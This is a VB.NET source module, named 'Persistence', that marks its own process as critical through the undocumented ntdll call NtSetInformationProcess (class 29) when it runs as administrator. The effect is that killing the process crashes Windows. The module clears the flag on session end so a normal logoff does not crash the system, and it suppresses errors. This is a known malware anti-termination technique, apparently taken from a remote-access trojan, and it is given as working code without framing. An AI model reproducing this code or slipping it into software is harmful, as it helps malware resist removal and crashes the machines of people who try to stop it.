Imports System.Runtime.InteropServices
Imports System.Security.Principal
Namespace Persistence
    Module SetProcCritical
        Public Sub CriticalProcess()
            On Error Resume Next
            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
                AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf NonCriticalProcess
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, 1, 4)
            End If
        End Sub
        Public Sub NonCriticalProcess()
            On Error Resume Next
            If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, 0, 4)
            End If
        End Sub
        <DllImport("ntdll.dll", SetLastError:=True)> _
        Private Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
        End Function
    End Module
End Namespace